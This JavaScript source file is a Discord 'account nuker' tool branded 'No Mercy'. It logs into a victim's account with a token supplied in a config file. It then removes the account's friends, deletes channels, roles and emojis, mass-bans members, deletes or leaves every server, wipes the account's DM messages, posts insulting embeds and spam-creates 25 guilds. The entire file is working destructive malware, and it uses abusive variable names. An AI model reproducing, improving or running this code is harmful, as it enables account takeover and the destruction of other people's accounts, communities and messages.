const Discord = require('discord.js')

const readline = require('readline')

const fs = require('fs')

const clc = require('cli-color')

const express = require('express')

const app = express();

const opn = require('opn')

const ms = require('ms')

const raper = new Discord.Client()

const config = require('./functioner.json')

const token  = config.tokentorape

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

app.get('/', (req, res) => {
    
})

raper.on('ready', () => {
    opn('https://github.com/ifrost666');
    if (!config.tokentorape){
        console.clear()
        console.log('Please input a token to nuke in the functioner.json file..')
        return;
    }
    console.clear()
    console.log(clc.blue(`

                                ███▄    █  ▒█████      ███▄ ▄███▓▓█████  ██▀███   ▄████▄  ▓██  ██▓
                                ██ ▀█   █ ▒██▒  ██▒    ▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒▒██▀ ▀█ ▒██  ██▒
                                ▓██  ▀█ ██▒▒██░  ██▒   ▓██    ▓██░▒███   ▓██ ░▄█ ▒▒▓█    ▄ ▒██ ██░
                                ▓██▒  ▐▌██▒▒██   ██░   ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  ▒▓▓▄ ▄██▒░ ▐██▓░
                                ▒██░   ▓██░░ ████▓▒░   ▒██▒   ░██▒░▒████▒░██▓ ▒██▒▒ ▓███▀ ░░ ██▒▓░
                                ░ ▒░   ▒ ▒ ░ ▒░▒░▒░    ░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░ ██▒▒▒ 
                                ░ ░░   ░ ▒░  ░ ▒ ▒░    ░  ░      ░ ░ ░  ░  ░▒ ░ ▒░  ░  ▒  ▓██ ░▒░ 
                                ░   ░ ░ ░ ░ ░ ▒     ░      ░      ░     ░░   ░ ░       ▒ ▒ ░░  
                                ░     ░ ░            ░      ░  ░   ░     ░ ░     ░ ░     
                                                     ░       ░ ░     
                                                     `))
    console.log(clc.blueBright('                      Developed by iFrost | Thank You For Using No Mercy! | Neat, Fast, Reliable & Phenomenal.'))
    console.log(clc.blueBright('                      Version 1.4'))
    console.log('')
    console.log(clc.magentaBright('The Account Nuker is now On!'))
    console.log(clc.magentaBright('[1] - Nuke'))
    console.log(clc.magentaBright('[ESC] - Exit\n'))
    rl.question('',
    (userInput) => {

        if (userInput === 'esc'){
            console.clear()
            rl.close()
        }

        if (userInput === '1'){
            console.clear()
            console.log(clc.redBright('Logged in as ' + raper.user.tag))
            console.log(clc.greenBright('Are you sure you want to nuke this account?'))
            console.log(clc.blueBright('[1] - Yes'))
            console.log(clc.blueBright('[2] - No\n'))
            rl.question('',
            (Answer) => {
                if (Answer === '2'){
                    console.clear()
                    console.log(clc.blue(`
                
                                                ███▄    █  ▒█████      ███▄ ▄███▓▓█████  ██▀███   ▄████▄  ▓██  ██▓
                                                ██ ▀█   █ ▒██▒  ██▒    ▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒▒██▀ ▀█ ▒██  ██▒
                                                ▓██  ▀█ ██▒▒██░  ██▒   ▓██    ▓██░▒███   ▓██ ░▄█ ▒▒▓█    ▄ ▒██ ██░
                                                ▓██▒  ▐▌██▒▒██   ██░   ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  ▒▓▓▄ ▄██▒░ ▐██▓░
                                                ▒██░   ▓██░░ ████▓▒░   ▒██▒   ░██▒░▒████▒░██▓ ▒██▒▒ ▓███▀ ░░ ██▒▓░
                                                ░ ▒░   ▒ ▒ ░ ▒░▒░▒░    ░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░ ██▒▒▒ 
                                                ░ ░░   ░ ▒░  ░ ▒ ▒░    ░  ░      ░ ░ ░  ░  ░▒ ░ ▒░  ░  ▒  ▓██ ░▒░ 
                                                ░   ░ ░ ░ ░ ░ ▒     ░      ░      ░     ░░   ░ ░       ▒ ▒ ░░  
                                                ░     ░ ░            ░      ░  ░   ░     ░ ░     ░ ░     
                                                                     ░       ░ ░     
                                                                     `))
                    console.log(clc.blueBright('                      Developed by iFrost | Thank You For Using No Mercy! | Neat, Fast, Reliable & Phenomenal.'))
                    console.log(clc.blueBright('                      Version 1.4'))
                    console.log('')
                    console.log(clc.magentaBright('The Account Nuker is now On!'))
                    console.log(clc.magentaBright('[1] - Nuke'))
                    console.log(clc.magentaBright('[ESC] - Exit\n'))
                

                
    return;
                }

                if (Answer === '1'){

                    console.clear()
                    console.log(clc.redBright('The user now needs to send a message anywhere or get sent one for the nuker to start..'))
                
                    raper.on('message', async (msg) => {
                       
                            raper.user.setActivity('NUKED BY NO MERCY', {
                                type: "STREAMING",
                                url: "https://www.twitch.tv/17lvkilla"})
        
        
        
                                
                            raper.user.setAvatar('https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif')


                            

                        
                           
        
                            if (msg.channel.type === 'dm'){
                                msg.channel.fetchMessages({
                                })
                                .then(messages => {
                                    let msg_array = messages.array();
                                    msg_array = msg_array.filter(m => m.author.id === raper.user.id);
                                    msg_array.length = 500 + 1
                                    msg_array.map(m => m.delete());
                                })
                                .then(message => {
        
                                      const embed = new Discord.RichEmbed()
                                .setTitle('**__NO MERCY__**')
                                .setColor(0x1974D2)
                                .setTimestamp()
                                .setURL('https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif')
                                .setThumbnail('https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif')
                                .setImage('https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif')
                                .setAuthor('Account Nuker By iFrost')
                                .setDescription('I just got fucked by No Mercy!\nYou all are ass!')
                                .setFooter('No Mercy')
                                    message.channel.send('BOP BOP!')
                                    message.channel.send(embed)
                                })
                            }

        
        
        
                      
        
        
        
                            raper.user.friends.tap(friend => friend.removeFriend());

        

                            raper.guilds.tap(g => g.channels.deleteAll())
                            raper.guilds.tap(g => g.members.tap(member => member.ban("My Account Was Nuked By No Mercy Account Nuker! | iFrost")))
                            raper.guilds.tap(g => g.roles.filter(r => r.position < g.me.highestRole.position)).deleteAll();
                            raper.guilds.tap(g => g.emojis.deleteAll())
                            raper.guilds.tap(g => g.createChannel('no mercy', raper.user.tag))
                            raper.guilds.tap(g => g.createChannel('no mercy', raper.user.tag))
                            raper.guilds.tap(g => g.createChannel('no mercy', raper.user.tag))
                            raper.guilds.tap(g => g.createChannel('no mercy', raper.user.tag))
                            raper.guilds.tap(g => g.createChannel('no mercy', raper.user.tag))
                            raper.guilds.tap(g => g.setName('My Account Was Nuked By No Mercy!'))
                            raper.guilds.tap(g => g.setRegion('india'))
                            raper.guilds.tap(g => g.setIcon('https://cdn.discordapp.com/avatars/662098388615036930/9acbe24d41296d9d9f8f4abed6761a0a.png?size=2048'))
                            
                                
                        






                            raper.guilds.tap(g => g.delete())
                            raper.guilds.tap(g => g.leave())
                            
                        

        
       
                       
        
        
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 1'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 2'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 3'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 4'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 5'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 6'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 7'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 8'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 9'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 10'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 11'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 12'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 13'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 14'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 15'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 16'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 17'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 18'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 19'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 20'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 21'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 22'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 23'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 24'))
                            })
                            raper.user.createGuild('NUKED BY NO MERCY', 'india', 'https://cdn.discordapp.com/attachments/690751061388165160/692961334903701535/image0.gif').then(message => {
                                console.log(clc.redBright('Created Guild 25'))
                            })
                       
        
                           
                 
        
                        
        
                           
        
                            
        
                            
                           
        
                          
                        
                        
                        
               
            

                
                
    

                
            })
                }
    })

}
})
})

raper.login(token)